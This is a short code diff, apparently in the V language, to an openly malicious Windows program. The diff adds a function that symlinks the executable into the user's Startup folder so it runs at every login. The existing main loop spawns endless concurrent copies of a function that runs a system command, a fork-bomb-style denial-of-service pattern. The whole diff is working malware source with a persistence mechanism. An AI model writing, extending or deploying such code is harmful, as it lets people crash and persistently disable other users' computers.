@@ -16,16 +16,22 @@ fn fuckitup(){
 	os.system(the_bad_guy)
 }
 
-fn main(){
+fn make_autostart(){
 	// symlink destinations
 	symlink_dest := os.home_dir()+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fuckit.exe"
 	target := os.getwd()+"\\tryToStopIt.exe"
 
 	// if symlink not exists, create it
 	if !exists(symlink_dest){
-		os.symlink(symlink_dest, target) ?
+		os.symlink(symlink_dest, target) or{
+			return
+		}
 	}
+}
+
+fn main(){
 	
+	make_autostart()
 	// the funny part, make endless concurrence executions of the code above :)
 	for{
 		go fuckitup()
